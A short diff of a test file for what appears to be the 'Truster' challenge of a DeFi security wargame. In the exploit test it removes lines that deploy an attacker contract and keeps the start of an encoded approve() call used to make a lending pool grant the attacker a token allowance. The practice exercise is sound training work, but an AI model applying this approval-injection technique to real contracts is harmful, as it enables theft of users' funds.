@@ -29,9 +29,6 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
-        //// Deploy target contract
-        const TrusterAttackerFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
-        let TA = await TrusterAttackerFactory.deploy(this.token.address);
         //// Create data
         let ABI = ["function approve(address spender,uint256 amount)"];
         let iface = new ethers.utils.Interface(ABI);
